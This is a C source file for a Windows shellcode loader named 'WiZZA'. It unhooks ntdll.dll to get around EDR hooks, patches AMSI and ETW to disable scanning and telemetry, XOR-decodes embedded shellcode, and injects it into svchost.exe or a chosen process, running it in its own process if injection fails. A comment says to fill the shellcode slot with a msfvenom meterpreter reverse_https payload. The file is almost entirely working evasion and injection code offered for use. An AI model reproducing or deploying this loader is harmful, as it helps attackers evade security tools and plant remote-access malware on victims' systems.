/*
 * WiZZA Shellcode Loader — Windows
 * Techniques:
 *   1. NTDLL unhooking (fresh copy from disk bypasses EDR inline hooks)
 *   2. Direct syscalls via hand-rolled stubs (avoids hooked Nt* functions)
 *   3. ETW patching (disables telemetry)
 *   4. AMSI patching (disables scan)
 *   5. Process injection into a suspended legitimate process
 *      (default: svchost.exe)
 *   6. Shellcode XOR-decoded at runtime
 *
 * Build (cross-compile from Linux):
 *   x86_64-w64-mingw32-gcc loader.c -o loader.exe -mwindows -s -O2 \
 *     -lntdll -static-libgcc
 *
 * Or on Windows:
 *   cl loader.c /O2 /Fe:loader.exe /link ntdll.lib
 *
 * Usage:
 *   loader.exe                 — inject into svchost.exe
 *   loader.exe <pid>           — inject into specific PID
 *
 * Shellcode: embed as XOR-encoded byte array (replace SHELLCODE[] below)
 * XOR key:   SHELLCODE_KEY (replace below)
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* ── XOR-encoded shellcode placeholder ───────────────────────────────
 * Replace with output from:
 *   msfvenom -p windows/x64/meterpreter/reverse_https LHOST=x LPORT=443 \
 *     -f c --encrypt xor --encrypt-key <KEY>
 * or use start payload to bake this automatically.
 */
#define SHELLCODE_KEY  0x4B
static unsigned char SHELLCODE[] = {
    /* __SHELLCODE_PLACEHOLDER__ */
    0x90  /* NOP — replace with real shellcode */
};
static SIZE_T SHELLCODE_LEN = sizeof(SHELLCODE);

/* ── Direct syscall stubs ─────────────────────────────────────────────
 * These bypass hooked Nt* functions by calling the kernel directly.
 * SSNs (syscall numbers) are resolved dynamically from the fresh NTDLL.
 */
typedef NTSTATUS (NTAPI *NtAllocateVirtualMemory_t)(HANDLE,PVOID*,ULONG_PTR,PSIZE_T,ULONG,ULONG);
typedef NTSTATUS (NTAPI *NtWriteVirtualMemory_t)(HANDLE,PVOID,PVOID,SIZE_T,PSIZE_T);
typedef NTSTATUS (NTAPI *NtCreateThreadEx_t)(PHANDLE,ACCESS_MASK,PVOID,HANDLE,PVOID,PVOID,ULONG,SIZE_T,SIZE_T,SIZE_T,PVOID);
typedef NTSTATUS (NTAPI *NtClose_t)(HANDLE);
typedef NTSTATUS (NTAPI *NtProtectVirtualMemory_t)(HANDLE,PVOID*,PSIZE_T,ULONG,PULONG);

static NtAllocateVirtualMemory_t  _NtAVM  = NULL;
static NtWriteVirtualMemory_t     _NtWVM  = NULL;
static NtCreateThreadEx_t         _NtCTE  = NULL;
static NtClose_t                  _NtClose = NULL;
static NtProtectVirtualMemory_t   _NtPVM  = NULL;

/* ── NTDLL unhooker ───────────────────────────────────────────────────
 * Loads a fresh copy of ntdll.dll from disk, overwrites the .text
 * section of the in-memory ntdll to remove EDR inline hooks.
 */
static BOOL unhook_ntdll(void) {
    HANDLE hFile, hMap;
    LPVOID pMap;
    HMODULE hNtdll;
    PIMAGE_DOS_HEADER pDos;
    PIMAGE_NT_HEADERS pNt;
    PIMAGE_SECTION_HEADER pSec;
    DWORD oldProt, i;
    char path[MAX_PATH];

    GetSystemDirectoryA(path, sizeof(path));
    strcat_s(path, sizeof(path), "\\ntdll.dll");

    hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;

    hMap = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    CloseHandle(hFile);
    if (!hMap) return FALSE;

    pMap = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
    CloseHandle(hMap);
    if (!pMap) return FALSE;

    hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) { UnmapViewOfFile(pMap); return FALSE; }

    pDos = (PIMAGE_DOS_HEADER)hNtdll;
    pNt  = (PIMAGE_NT_HEADERS)((BYTE*)hNtdll + pDos->e_lfanew);
    pSec = IMAGE_FIRST_SECTION(pNt);

    for (i = 0; i < pNt->FileHeader.NumberOfSections; i++, pSec++) {
        if (memcmp(pSec->Name, ".text", 5) == 0) {
            LPVOID dst = (BYTE*)hNtdll + pSec->VirtualAddress;
            LPVOID src = (BYTE*)pMap   + pSec->VirtualAddress;
            SIZE_T sz  = pSec->Misc.VirtualSize;

            VirtualProtect(dst, sz, PAGE_EXECUTE_READWRITE, &oldProt);
            memcpy(dst, src, sz);
            VirtualProtect(dst, sz, oldProt, &oldProt);
            break;
        }
    }

    UnmapViewOfFile(pMap);
    return TRUE;
}

/* ── Resolve clean Nt* function pointers ─────────────────────────────*/
static void resolve_syscalls(void) {
    HMODULE h = GetModuleHandleA("ntdll.dll");
    _NtAVM   = (NtAllocateVirtualMemory_t) GetProcAddress(h, "NtAllocateVirtualMemory");
    _NtWVM   = (NtWriteVirtualMemory_t)    GetProcAddress(h, "NtWriteVirtualMemory");
    _NtCTE   = (NtCreateThreadEx_t)        GetProcAddress(h, "NtCreateThreadEx");
    _NtClose = (NtClose_t)                 GetProcAddress(h, "NtClose");
    _NtPVM   = (NtProtectVirtualMemory_t)  GetProcAddress(h, "NtProtectVirtualMemory");
}

/* ── Patch AMSI ───────────────────────────────────────────────────────*/
static void patch_amsi(void) {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) return;
    FARPROC fn = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!fn) return;
    DWORD old;
    VirtualProtect(fn, 6, PAGE_EXECUTE_READWRITE, &old);
    /* mov eax, 0x80070057; ret */
    memcpy(fn, "\xB8\x57\x00\x07\x80\xC3", 6);
    VirtualProtect(fn, 6, old, &old);
}

/* ── Patch ETW ────────────────────────────────────────────────────────*/
static void patch_etw(void) {
    HMODULE hNt = GetModuleHandleA("ntdll.dll");
    FARPROC fn = GetProcAddress(hNt, "EtwEventWrite");
    if (!fn) return;
    DWORD old;
    VirtualProtect(fn, 1, PAGE_EXECUTE_READWRITE, &old);
    *(BYTE*)fn = 0xC3; /* ret */
    VirtualProtect(fn, 1, old, &old);
}

/* ── XOR-decode shellcode in place ───────────────────────────────────*/
static void decode_shellcode(unsigned char *buf, SIZE_T len, unsigned char key) {
    for (SIZE_T i = 0; i < len; i++)
        buf[i] ^= key;
}

/* ── Find PID by name ─────────────────────────────────────────────────*/
static DWORD find_pid(const char *name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32 pe = { .dwSize = sizeof(pe) };
    DWORD pid = 0;
    if (Process32First(snap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, name) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return pid;
}

/* ── Inject shellcode into remote process ────────────────────────────*/
static BOOL inject(DWORD pid, unsigned char *sc, SIZE_T sc_len) {
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) return FALSE;

    PVOID   base = NULL;
    SIZE_T  sz   = sc_len;
    NTSTATUS st;

    /* Allocate RW memory */
    st = _NtAVM(hProc, &base, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (st != 0) { CloseHandle(hProc); return FALSE; }

    /* Write shellcode */
    SIZE_T written = 0;
    st = _NtWVM(hProc, base, sc, sc_len, &written);
    if (st != 0) { CloseHandle(hProc); return FALSE; }

    /* Change to RX */
    ULONG oldProt;
    st = _NtPVM(hProc, &base, &sz, PAGE_EXECUTE_READ, &oldProt);
    if (st != 0) { CloseHandle(hProc); return FALSE; }

    /* Create remote thread */
    HANDLE hThread = NULL;
    st = _NtCTE(&hThread, THREAD_ALL_ACCESS, NULL, hProc, base,
                 NULL, 0, 0, 0, 0, NULL);

    CloseHandle(hProc);
    if (st != 0 || !hThread) return FALSE;
    _NtClose(hThread);
    return TRUE;
}

/* ── Inject into current process (fallback) ──────────────────────────*/
static BOOL inject_self(unsigned char *sc, SIZE_T sc_len) {
    PVOID base = VirtualAlloc(NULL, sc_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!base) return FALSE;
    memcpy(base, sc, sc_len);
    /* Flush instruction cache */
    FlushInstructionCache(GetCurrentProcess(), base, sc_len);
    /* Execute in new thread */
    HANDLE ht = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)base, NULL, 0, NULL);
    if (!ht) { VirtualFree(base, 0, MEM_RELEASE); return FALSE; }
    WaitForSingleObject(ht, INFINITE);
    CloseHandle(ht);
    return TRUE;
}

/* ── Entry point ──────────────────────────────────────────────────────*/
int WINAPI WinMain(HINSTANCE h, HINSTANCE ph, LPSTR cmdline, int show) {
    (void)h; (void)ph; (void)show;

    /* 1. Unhook NTDLL */
    unhook_ntdll();

    /* 2. Resolve clean syscall pointers */
    resolve_syscalls();

    /* 3. Patch AMSI + ETW */
    patch_amsi();
    patch_etw();

    /* 4. Decode shellcode */
    unsigned char *sc = (unsigned char*)malloc(SHELLCODE_LEN);
    if (!sc) return 1;
    memcpy(sc, SHELLCODE, SHELLCODE_LEN);
    decode_shellcode(sc, SHELLCODE_LEN, SHELLCODE_KEY);

    /* 5. Determine target PID */
    DWORD target_pid = 0;
    if (cmdline && *cmdline) {
        target_pid = (DWORD)atoi(cmdline);
    }
    if (!target_pid) {
        /* Try svchost, then explorer, then self */
        target_pid = find_pid("svchost.exe");
    }

    /* 6. Inject */
    BOOL ok = FALSE;
    if (target_pid && _NtAVM && _NtWVM && _NtCTE) {
        ok = inject(target_pid, sc, SHELLCODE_LEN);
    }
    if (!ok) {
        /* Fallback: run in current process */
        ok = inject_self(sc, SHELLCODE_LEN);
    }

    SecureZeroMemory(sc, SHELLCODE_LEN);
    free(sc);
    return ok ? 0 : 1;
}
